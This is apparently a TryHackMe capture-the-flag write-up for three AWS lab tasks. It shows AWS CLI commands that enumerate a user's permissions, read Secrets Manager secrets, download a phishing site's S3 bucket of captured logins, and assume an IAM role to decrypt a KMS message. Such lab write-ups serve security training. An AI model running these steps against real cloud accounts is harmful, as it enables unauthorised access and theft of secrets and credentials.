## Task 34:
### Configure aws cli login

+ Use `aws configure` with the Access Key, Secret Access Key and Region to login.

### Find out our username and id

`aws sts get-caller-identity` returns

```
{
    "UserId": "AIDAU2VYTBGYFN7UYYE5T",
    "Account": "332173347248",
    "Arn": "arn:aws:iam::332173347248:user/user0"
}
```

### Finding Service with permission

+ Now we are trying to get an output from different AWS Services by just using simple operations like listing stuff to see where we are successfull:
`aws s3 ls` -> AccessDenied
`aws ec2 describe-instances` -> AccessDenied
`aws secretsmanager list-secrets` -> Resoponse
```
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-west-2:332173347248:secret:secret-flag-Im0H0Z",
            "Name": "secret-flag",
            "LastChangedDate": "2025-03-17T08:15:42.026000+01:00",
            "LastAccessedDate": "2025-03-18T01:00:00+01:00",
            "Tags": [],
            "SecretVersionsToStages": {
                "a007a97d-73c7-430d-879f-e9cc72013f6a": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2025-03-17T08:15:41.704000+01:00"
        }
    ]
}
```

### Retrieving the flag

+ Looks like there is a secret we have access to.
+ We can view it using `aws secretsmanager get-secret-value --secret-id secret-flag` which returns the flag.
```
{
    "ARN": "arn:aws:secretsmanager:us-west-2:332173347248:secret:secret-flag-Im0H0Z",
    "Name": "secret-flag",
    "VersionId": "a007a97d-73c7-430d-879f-e9cc72013f6a",
    "SecretString": "{\"flag\":\"THM{for_your_eyes_only}\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2025-03-17T08:15:42.022000+01:00"
}
```

## Task 35:
### Checking the webpage

`http://darkinjector-phish.s3-website-us-west-2.amazonaws.com`
+ Is just an ordinary login page. But the important part is, that it is hosted on a AWS S3 Service, which is a storage service where you can also run static webpages off.

### Getting access to the storage bucket

+ Let's check if we can list the stuff thats in this s3 bucket by using `aws s3 ls s3://darkinjector-phish --region us-west-2`

+ Easy. We got an output:
```
2025-03-17 07:46:17        132 captured-logins-093582390
2025-03-17 07:25:33       2300 index.html
```

### Downloading the files

+ We can just copy those files to our local machine by using `aws s3 sync s3://darkinjector-phish/ ./local-dir --region us-west-2`

### Getting the flag

+ Now we just check the insights of the `captured-logins` file. It is a CSV containing the flag:

```
user,pass
munra@thm.thm,Password123
test@thm.thm,123456
mario@thm.thm,Mario123
flag@thm.thm,THM{this_is_not_what_i_meant_by_public}
```

## Task 36:
### Configure aws cli login

+ Use `aws configure` with the Access Key, Secret Access Key and Region to login.

### Find out our username and id

`aws sts get-caller-identity` returns

```
{
    "UserId": "AIDAU2VYTBGYOJ7ASKCAP",
    "Account": "332173347248",
    "Arn": "arn:aws:iam::332173347248:user/user1"
}
```

### Getting the file

+ We can use `aws s3 ls s3://secret-messages --region us-west-2` to list and `aws s3 cp s3://secret-messages/20250301.msg.enc . --region us-west-2` to download the file mentioned in the task.

### Inspecting the file

+ The file holds JSON data for a Ciphertext and some KeyId storage in AWS KMS (some kind of key management system).
But our user does not have access to the KMS to decrypt the message.

### Finding access

+ Let's check for configured roles with `aws iam list-roles`.
+ We find one role where our user1 is listed under the principals:
```
{
            "Path": "/",
            "RoleName": "crypto-master",
            "RoleId": "AROAU2VYTBGYKCB3S25MX",
            "Arn": "arn:aws:iam::332173347248:role/crypto-master",
            "CreateDate": "2025-03-17T08:40:18+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Sid": "Statement1",
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "arn:aws:iam::332173347248:user/user1"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            }
}
```

+ We can assume the role with `aws sts assume-role --role-arn arn:aws:iam::332173347248:role/crypto-master --role-session-name decrypt-session`

+ Nice. It is valid, so it returns some temporary credentials:
```
{
    "Credentials": {
        "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
        "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "SessionToken": "FQoGZXIvYXdz...",
        "Expiration": "2025-03-18T15:00:00Z"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAU2VYTBGYKCB3S25MX:decrypt-session",
        "Arn": "arn:aws:iam::332173347248:role/crypto-master"
    }
}
```

+ We can export the credentials
```
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_SESSION_TOKEN="FQoGZXIvYXdz..."
```

and confirm the switch with `aws sts get-caller-identity`
```
{
    "UserId": "AROAU2VYTBGYKCB3S25MX:decrypt-session",
    "Account": "332173347248",
    "Arn": "arn:aws:sts::332173347248:assumed-role/crypto-master/decrypt-session"
}
```
--> We are crypto-master now.

### Decrypt the message and get the flag

+ Now with the crypto-master role we have access to the KMS and can decrypt the message
`aws kms decrypt --ciphertext-blob fileb://encrypted_blob.bin --key-id arn:aws:kms:us-west-2:332173347248:key/b7a
11be8-2a95-429e-978c-36a18a0d3e81 --region us-west-2 --query Plaintext --output text | base64 --decode`

+ Which returns:
```
To Cipher,

I trust this letter finds you in the usual manner — lurking in the shadows, plotting your next grand scheme. Though we are well aware of your notorious abilities, it seems there is still much potential for even greater power at your fingertips.

I am writing to you, Cipher, not only to acknowledge your skills but to propose an alliance of sorts. Your penchant for manipulation of digital systems and mine for delving into the very fabric of reality itself could culminate in a masterpiece of absolute control.

I have discovered the key to hacking time itself — a process far beyond the scope of mere algorithms. The foundation lies in manipulating the quantum fabric and exploiting the synchronization of universal chronal waves. Once we control this frequency, we can write our own timeline.

THM{crypto_cloud_conundrum}
```